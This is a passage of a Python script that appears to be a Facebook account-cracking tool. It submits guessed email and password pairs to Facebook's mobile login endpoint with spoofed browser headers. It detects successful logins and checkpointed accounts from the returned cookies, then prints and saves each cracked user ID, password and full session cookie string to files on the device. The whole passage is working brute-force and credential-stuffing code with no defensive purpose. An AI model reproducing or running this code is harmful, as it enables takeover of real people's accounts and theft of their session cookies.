            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
            user_info = {'Host': f'{fb}.facebook.com',
            'method': 'GET',
            'path':'/login/device-based/regular/login/?login_attempt=1&lwv=100',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            PAPI_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[PAPI-OK-🔷] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    os.system('espeak -a 300 " Papi,  Ok,  id"')
                    open('/sdcard/PAPI-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/PAPI-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.findall("c_user=(.*);xs", coki)[0]
                print(f"\r\r {c}[PAPI-CP] {uid} | {pww}")
                os.system('espeak -a 300 " ,  cp,  id"')
                open('/sdcard/PAPI-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass 
PAPI_main()
